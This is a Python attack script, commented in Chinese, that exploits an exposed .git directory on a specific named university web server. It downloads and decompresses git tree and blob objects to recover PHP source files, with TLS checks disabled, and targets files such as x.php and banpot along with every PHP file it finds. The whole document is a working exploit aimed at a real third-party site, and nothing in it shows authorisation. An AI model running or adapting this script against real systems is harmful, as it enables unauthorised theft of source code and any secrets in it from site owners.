#!/usr/bin/env python3
import requests
import zlib
import re
urllib3 = __import__('urllib3')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th"

# 下载tree对象
tree_hash = "206be85b2f5820dcbb812b49c73c77c48027d4d3"
tree_path = f"/.git/objects/{tree_hash[:2]}/{tree_hash[2:]}"

print(f"[*] 下载tree对象: {tree_hash}")
resp = requests.get(url + tree_path, verify=False, timeout=10)

if resp.status_code == 200:
    tree_data = zlib.decompress(resp.content)
    print(f"[+] Tree对象下载成功: {len(tree_data)} bytes")
    
    # 解析tree对象
    # tree格式: mode filename\0hash(20 bytes)
    pos = 0
    files = []
    
    while pos < len(tree_data):
        # 查找null分隔符
        null_pos = tree_data.find(b'\0', pos)
        if null_pos == -1:
            break
        
        # 获取mode和filename
        mode_name = tree_data[pos:null_pos]
        parts = mode_name.split(b' ', 1)
        if len(parts) == 2:
            mode = parts[0].decode()
            filename = parts[1].decode()
            
            # 获取hash（20字节）
            hash_start = null_pos + 1
            hash_bytes = tree_data[hash_start:hash_start+20]
            hash_hex = hash_bytes.hex()
            
            files.append((mode, filename, hash_hex))
            print(f"  文件: {filename} (hash: {hash_hex})")
            
            pos = hash_start + 20
        else:
            break
    
    # 查找x.php
    for mode, filename, file_hash in files:
        if 'x.php' in filename or 'scmeeting' in filename:
            print(f"\n[+] 找到目标文件: {filename} (hash: {file_hash})")
            
            # 下载blob对象
            blob_path = f"/.git/objects/{file_hash[:2]}/{file_hash[2:]}"
            print(f"[*] 下载blob对象: {file_hash}")
            
            resp2 = requests.get(url + blob_path, verify=False, timeout=10)
            if resp2.status_code == 200:
                blob_data = zlib.decompress(resp2.content)
                
                # 解析blob对象: "blob size\0content"
                null_pos = blob_data.find(b'\0')
                if null_pos != -1:
                    file_content = blob_data[null_pos+1:].decode('utf-8', errors='ignore')
                    print("\n[+] x.php文件内容:")
                    print("=" * 70)
                    print(file_content)
                    print("=" * 70)
                    exit(0)
                else:
                    print("[-] Blob对象格式异常")
            else:
                print(f"[-] 下载blob失败: {resp2.status_code}")
    
    # 如果没有直接找到，尝试下载所有PHP文件
    print("\n[*] 下载所有PHP文件...")
    for mode, filename, file_hash in files:
        if filename.endswith('.php'):
            blob_path = f"/.git/objects/{file_hash[:2]}/{file_hash[2:]}"
            resp2 = requests.get(url + blob_path, verify=False, timeout=5)
            if resp2.status_code == 200:
                blob_data = zlib.decompress(resp2.content)
                null_pos = blob_data.find(b'\0')
                if null_pos != -1:
                    content = blob_data[null_pos+1:].decode('utf-8', errors='ignore')
                    if '<?php' in content and len(content) > 50:
                        print(f"\n[+] {filename}:")
                        print(content[:500])
                        if 'x.php' in filename or 'banpot' in filename:
                            print("\n完整内容:")
                            print(content)
else:
    print(f"[-] 下载tree失败: {resp.status_code}")
